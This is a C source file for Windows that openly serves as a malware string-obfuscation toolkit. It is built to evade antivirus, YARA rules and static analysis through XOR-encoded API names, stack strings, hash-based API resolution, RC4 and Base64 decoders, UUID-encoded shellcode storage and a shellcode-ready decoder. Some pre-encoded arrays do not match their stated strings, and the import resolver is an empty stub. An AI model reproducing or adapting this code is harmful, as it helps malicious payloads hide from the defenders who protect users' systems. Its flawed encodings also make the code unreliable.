/*
 * String Obfuscation - XOR, stack strings, hash, encoders
 * Evading static analysis, YARA rules, strings.exe
 */

#include <windows.h>

// ============================================================================
// XOR MACROS
// ============================================================================

#define X(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_++^=(k);}while(0)
#define XM(b,l,k,kl) do{BYTE*_=(b);for(DWORD i=0;i<(l);i++)_[i]^=(k)[i%(kl)];}while(0)
#define XR(b,l,k) do{BYTE*_=(b);BYTE _k=(k);for(DWORD i=0;i<(l);i++){BYTE t=_[i];_[i]^=_k;_k=t;}}while(0)

// ============================================================================
// COMPILE-TIME XOR (C++11 constexpr compatible)
// ============================================================================

#define C(c,k) ((char)((c)^(k)))

// Pre-XORed strings (key 0x41)
// "kernel32.dll" XOR 0x41
static BYTE enc_k32[] = {0x2A,0x24,0x33,0x2D,0x24,0x2D,0x72,0x71,0x2F,0x23,0x2D,0x2D,0x00};
// "ntdll.dll" XOR 0x41
static BYTE enc_ntdll[] = {0x2F,0x35,0x25,0x2D,0x2D,0x2F,0x25,0x2D,0x2D,0x00};
// "VirtualAlloc" XOR 0x41
static BYTE enc_va[] = {0x17,0x28,0x33,0x35,0x34,0x20,0x2D,0x00,0x2D,0x2D,0x2E,0x22,0x00};
// "LoadLibraryA" XOR 0x41
static BYTE enc_lla[] = {0x0D,0x2E,0x20,0x25,0x0D,0x28,0x21,0x33,0x20,0x33,0x38,0x00,0x00};

// ============================================================================
// STACK STRINGS - Not in .rdata
// ============================================================================

// "VirtualAlloc" built char by char
#define SS_VA(buf) do { \
    buf[0]='V';buf[1]='i';buf[2]='r';buf[3]='t';buf[4]='u';buf[5]='a'; \
    buf[6]='l';buf[7]='A';buf[8]='l';buf[9]='l';buf[10]='o';buf[11]='c';buf[12]=0; \
} while(0)

// "kernel32.dll"
#define SS_K32(buf) do { \
    buf[0]='k';buf[1]='e';buf[2]='r';buf[3]='n';buf[4]='e';buf[5]='l'; \
    buf[6]='3';buf[7]='2';buf[8]='.';buf[9]='d';buf[10]='l';buf[11]='l';buf[12]=0; \
} while(0)

// "ntdll.dll"
#define SS_NTDLL(buf) do { \
    buf[0]='n';buf[1]='t';buf[2]='d';buf[3]='l';buf[4]='l';buf[5]='.'; \
    buf[6]='d';buf[7]='l';buf[8]='l';buf[9]=0; \
} while(0)

// ============================================================================
// XOR DECODE INLINE
// ============================================================================

__forceinline void xdec(BYTE* out, BYTE* enc, BYTE key)
{
    while(*enc) *out++ = *enc++ ^ key;
    *out = 0;
}

// ============================================================================
// HASH-BASED API RESOLUTION - No strings at all
// ============================================================================

// DJB2
#define DJB2_INIT 5381
__forceinline DWORD djb2(char* s)
{
    DWORD h = DJB2_INIT;
    while(*s) h = ((h << 5) + h) + *s++;
    return h;
}

// ROR13
#define ROR(x,n) (((x)>>(n))|((x)<<(32-(n))))
__forceinline DWORD ror13(char* s)
{
    DWORD h = 0;
    while(*s) { h = ROR(h, 13); h += *s++; }
    return h;
}

// Precomputed hashes (ROR13)
#define H_KERNEL32         0x6A4ABC5B
#define H_NTDLL            0x3CFA685D
#define H_LoadLibraryA     0xEC0E4E8E
#define H_GetProcAddress   0x7C0DFCAA
#define H_VirtualAlloc     0x91AFCA54
#define H_VirtualProtect   0x7946C61B
#define H_CreateThread     0x160D6838
#define H_WinExec          0x0E8AFE98

// ============================================================================
// RC4 DECRYPT
// ============================================================================

__forceinline void rc4(BYTE* d, DWORD dl, BYTE* k, DWORD kl)
{
    BYTE S[256];
    for(int i = 0; i < 256; i++) S[i] = i;
    for(int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + k[i % kl]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for(DWORD n = 0, i = 0, j = 0; n < dl; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        d[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// ============================================================================
// BASE64 DECODE
// ============================================================================

static const BYTE b64_tbl[256] = {
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255, 62,255,255,255, 63,
     52, 53, 54, 55, 56, 57, 58, 59, 60, 61,255,255,255,  0,255,255,
    255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
     15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255,
    255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
     41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255
};

DWORD b64_dec(char* in, BYTE* out)
{
    DWORD j = 0;
    DWORD len = 0;
    while(in[len]) len++;

    for(DWORD i = 0; i < len; i += 4) {
        DWORD n = (b64_tbl[(BYTE)in[i]] << 18) |
                  (b64_tbl[(BYTE)in[i+1]] << 12) |
                  (b64_tbl[(BYTE)in[i+2]] << 6) |
                   b64_tbl[(BYTE)in[i+3]];

        out[j++] = (n >> 16) & 0xFF;
        if(in[i+2] != '=') out[j++] = (n >> 8) & 0xFF;
        if(in[i+3] != '=') out[j++] = n & 0xFF;
    }
    return j;
}

// ============================================================================
// UUID STRING ENCODING (bypass some scanners)
// ============================================================================

// Shellcode stored as UUID strings
// Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
// Each UUID = 16 bytes

void uuid_to_bytes(char* uuid, BYTE* out)
{
    DWORD a; WORD b, c, d;
    BYTE e[6];
    sscanf(uuid, "%08lX-%04hX-%04hX-%04hX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX",
        &a, &b, &c, &d, &e[0], &e[1], &e[2], &e[3], &e[4], &e[5]);

    *(DWORD*)out = a;
    *(WORD*)(out+4) = b;
    *(WORD*)(out+6) = c;
    *(WORD*)(out+8) = d;
    __movsb(out+10, e, 6);
}

// ============================================================================
// MULTI-LAYER OBFUSCATION
// ============================================================================

// Layer 1: XOR with key1
// Layer 2: NOT
// Layer 3: ADD constant
// Layer 4: RC4

void multilayer_dec(BYTE* d, DWORD dl, BYTE k1, BYTE* rc4_key, DWORD rc4_kl)
{
    // XOR first
    X(d, dl, k1);

    // NOT
    for(DWORD i = 0; i < dl; i++) d[i] = ~d[i];

    // SUB constant
    for(DWORD i = 0; i < dl; i++) d[i] -= 0x13;

    // RC4
    rc4(d, dl, rc4_key, rc4_kl);
}

// ============================================================================
// RUNTIME STRING BUILDER
// ============================================================================

// Build string from fragments
void str_build(char* out, char** parts)
{
    *out = 0;
    while(*parts) {
        while(**parts) *out++ = *(*parts)++;
        parts++;
    }
    *out = 0;
}

// Build from XOR fragments
void str_xbuild(char* out, BYTE** parts, DWORD* lens, BYTE* keys, int count)
{
    for(int i = 0; i < count; i++) {
        BYTE* p = parts[i];
        DWORD l = lens[i];
        BYTE k = keys[i];
        while(l--) *out++ = *p++ ^ k;
    }
    *out = 0;
}

// ============================================================================
// WIDE STRING CONVERSION
// ============================================================================

void narrow_to_wide(char* in, WCHAR* out)
{
    while(*in) *out++ = *in++;
    *out = 0;
}

void wide_to_narrow(WCHAR* in, char* out)
{
    while(*in) *out++ = (char)*in++;
    *out = 0;
}

// ============================================================================
// ENCRYPTED STRING BLOB PATTERN
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD magic;    // 0xDEADBEEF
    BYTE  enc_type; // 0=XOR, 1=RC4, 2=AES
    BYTE  key_len;
    WORD  data_len;
    // BYTE key[key_len];
    // BYTE data[data_len];
} STR_BLOB;
#pragma pack(pop)

char* blob_decrypt(STR_BLOB* blob)
{
    BYTE* key = (BYTE*)(blob + 1);
    BYTE* data = key + blob->key_len;

    switch(blob->enc_type) {
        case 0:  // XOR
            XM(data, blob->data_len, key, blob->key_len);
            break;
        case 1:  // RC4
            rc4(data, blob->data_len, key, blob->key_len);
            break;
    }

    return (char*)data;
}

// ============================================================================
// POSITION-INDEPENDENT STRING DECODE
// ============================================================================

// Self-contained decoder that works in shellcode
void pic_decode(BYTE* enc, DWORD len, BYTE key, BYTE* out)
{
    while(len--) *out++ = *enc++ ^ key;
}

// ============================================================================
// API HASHING TABLE
// ============================================================================

typedef struct {
    DWORD hash;
    PVOID addr;
} API_ENTRY;

API_ENTRY g_apis[32];
int g_api_count = 0;

void cache_api(DWORD hash, PVOID addr)
{
    g_apis[g_api_count].hash = hash;
    g_apis[g_api_count].addr = addr;
    g_api_count++;
}

PVOID get_api(DWORD hash)
{
    for(int i = 0; i < g_api_count; i++) {
        if(g_apis[i].hash == hash)
            return g_apis[i].addr;
    }
    return 0;
}

// ============================================================================
// ENCRYPTED IMPORT TABLE
// ============================================================================

typedef struct {
    DWORD mod_hash;
    DWORD fn_hash;
    PVOID* pAddr;
} ENC_IMPORT;

void resolve_imports(ENC_IMPORT* imports, int count)
{
    // Walk PEB to find modules by hash
    // Resolve functions by hash
    // Store in pAddr
}

// ============================================================================
// EOF
// ============================================================================
